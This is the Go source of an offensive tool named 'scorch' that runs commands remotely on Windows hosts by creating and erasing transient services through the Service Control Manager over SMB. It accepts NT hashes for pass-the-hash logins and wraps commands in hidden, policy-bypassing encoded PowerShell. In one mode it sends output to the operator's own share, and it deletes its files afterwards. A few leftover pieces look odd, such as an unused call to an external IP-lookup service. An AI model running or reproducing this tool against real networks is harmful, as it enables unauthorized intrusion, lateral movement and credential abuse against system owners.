// scorch — remote command execution via Windows Service Control Manager.
// Each command is wrapped in a transient service that writes output to a share
// file, retrieved over SMB and printed locally. No persistent service survives.
package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/go-impacket/kit/internal/cred"
	"github.com/go-impacket/kit/internal/dcerpc"
	"github.com/go-impacket/kit/internal/shell"
	"github.com/go-impacket/kit/internal/transport"
	"github.com/go-impacket/kit/pkg/randname"
	"github.com/jfjallid/go-smb/smb"
)

func main() {
	target := flag.String("t", "", "[[domain/]user[:pass]@]host")
	hashes := flag.String("H", "", "LMHASH:NTHASH")
	share := flag.String("share", "C$", "share for output file (default C$)")
	mode := flag.String("mode", "SHARE", "SHARE or SERVER")
	shellType := flag.String("shell", "cmd", "cmd or powershell")
	port := flag.Int("port", 445, "SMB port")
	svcName := flag.String("svc", "", "service name (random if empty)")
	dcIP := flag.String("dc", "", "domain controller IP")
	timeout    := flag.Duration("timeout", 30*time.Second, "per-command timeout")
	debug      := flag.Bool("debug", false, "verbose output")
	proxyAddr  := flag.String("proxy", "", "SOCKS5 proxy socks5://host:port")
	flag.Parse()

	_ = dcIP

	if *target == "" {
		flag.Usage()
		os.Exit(1)
	}

	if *debug {
		log.SetFlags(log.Ltime | log.Lmicroseconds)
	} else {
		log.SetOutput(os.Stderr)
	}

	domain, user, pass, host, err := cred.ParseTarget(*target)
	if err != nil {
		fatal("parse target: %v", err)
	}

	bundle := &cred.Bundle{
		Username: user,
		Password: pass,
		Domain:   domain,
		ProxyURL: *proxyAddr,
	}

	if *hashes != "" {
		_, nt, err := cred.FromHashes(*hashes)
		if err != nil {
			fatal("parse hashes: %v", err)
		}
		bundle.NTHash = nt
		bundle.Password = ""
	}

	if user == "" {
		fmt.Fprintf(os.Stderr, "Password: ")
		pass = readPassword()
		bundle.Password = pass
	}

	ep, err := transport.Dial(host, *port, bundle)
	if err != nil {
		fatal("connect: %v", err)
	}
	defer ep.Close()

	conn := ep.Raw()

	if err := conn.TreeConnect(*share); err != nil {
		fatal("connect share %s: %v", *share, err)
	}
	defer conn.TreeDisconnect(*share)

	sc, err := dcerpc.AttachSCMR(conn)
	if err != nil {
		fatal("SCM: %v", err)
	}
	defer sc.Close()

	svc := *svcName
	if svc == "" {
		svc = randname.Alpha(8)
	}

	prompt := "C:\\>"
	refreshPrompt(conn, *share, sc, svc, *shellType, *timeout, &prompt)

	fmt.Println("[!] scorch — semi-interactive shell via service creation")

	repl := shell.New(prompt, func(line string) (string, bool) {
		line = strings.TrimSpace(line)
		switch strings.ToLower(line) {
		case "exit", "quit":
			return "", true
		case "":
			return "", false
		}

		out, err := runRemote(conn, sc, *share, host, svc, line, *shellType, *mode, *timeout)
		if err != nil {
			return fmt.Sprintf("[!] %v", err), false
		}
		if out == "" {
			return "[i] (empty output — command may have failed silently)", false
		}
		repl2 := shell.New("", nil)
		_ = repl2
		refreshPrompt(conn, *share, sc, svc, *shellType, *timeout, &prompt)
		return out, false
	})

	repl.Run()
}

func runRemote(conn *smb.Connection, sc *dcerpc.ServiceController, share, host, svcName, cmd, shellType, mode string, timeout time.Duration) (string, error) {
	outFile := "__o_" + randname.Alnum(8)
	batFile := randname.Alpha(8) + ".bat"

	var outputPath string
	if mode == "SERVER" {
		localIP := getOutboundIP()
		outputPath = fmt.Sprintf("\\\\%s\\TMP\\%s", localIP, outFile)
	} else {
		outputPath = fmt.Sprintf("\\\\%%COMPUTERNAME%%\\%s\\%s", share, outFile)
	}

	var payload string
	if shellType == "powershell" {
		data := "$ProgressPreference='SilentlyContinue';" + cmd
		enc := base64.StdEncoding.EncodeToString(encodeUTF16LE(data))
		cmd = "powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc " + enc
	}

	shell := "%COMSPEC% /Q /c "
	batPath := "%SYSTEMROOT%\\" + batFile

	payload = fmt.Sprintf(
		`%secho %s ^> %s 2^>^&1 > %s & %s%s & del %s`,
		shell, cmd, outputPath, batPath,
		shell, batPath,
		batPath,
	)

	if err := sc.IgniteAndErase(svcName, payload); err != nil {
		return "", err
	}

	deadline := time.Now().Add(timeout)
	var buf []byte
	for time.Now().Before(deadline) {
		var chunk []byte
		err := conn.RetrieveFile(share, outFile, 0, func(data []byte) (int, error) {
			chunk = append(chunk, data...)
			return len(data), nil
		})
		if err == nil {
			buf = chunk
			_ = conn.DeleteFile(share, outFile)
			break
		}
		time.Sleep(300 * time.Millisecond)
	}

	return strings.TrimRight(string(buf), "\r\n"), nil
}

func refreshPrompt(conn *smb.Connection, share string, sc *dcerpc.ServiceController, svc, shellType string, timeout time.Duration, prompt *string) {
	out, err := runRemote(conn, sc, share, "", svc, "cd", shellType, "SHARE", timeout)
	if err == nil && out != "" {
		*prompt = strings.TrimRight(out, "\r\n") + ">"
		if shellType == "powershell" {
			*prompt = "PS " + *prompt + " "
		}
	}
}

func getOutboundIP() string {
	resp, err := http.Get("https://api.ipify.org")
	if err == nil {
		defer resp.Body.Close()
	}
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func encodeUTF16LE(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	return buf
}

func readPassword() string {
	var s string
	fmt.Scanln(&s)
	return s
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[-] "+format+"\n", args...)
	os.Exit(1)
}
